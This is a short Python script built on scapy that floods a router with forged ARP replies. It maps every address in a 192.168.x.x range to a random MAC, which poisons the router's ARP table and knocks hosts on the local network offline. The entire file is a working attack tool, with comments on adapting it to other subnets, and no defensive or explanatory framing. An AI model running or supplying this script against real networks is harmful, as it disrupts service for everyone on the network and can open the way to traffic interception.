import sys
import rstr
from scapy.all import *


def ArpS(MacRouter, IpRouter, MacRandom, n, w):
        ip = "192.168."+str(w)+"."+str(n) #Change this by your network for exemple : "172.168." /16
        packet = ARP(op="is-at", hwdst=MacRouter, pdst=IpRouter, hwsrc=MacRandom, psrc=ip)
        send(packet, verbose=False)
        print(ip)

Ip_Router  = sys.argv[1]
Mac_Router = getmacbyip(Ip_Router)

for z in range(0, 255): # ADD loop for if you need for more subnetting.
        for i in range(0, 255):
                try:
                        Mac = str(rstr.xeger(r'[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]')) # If you want you can set a filter for router and broadcast mac address
                        ArpS(Mac_Router, Ip_Router, Mac, i, z)
                except KeyboardInterrupt:
                        print("End")
                        exit()
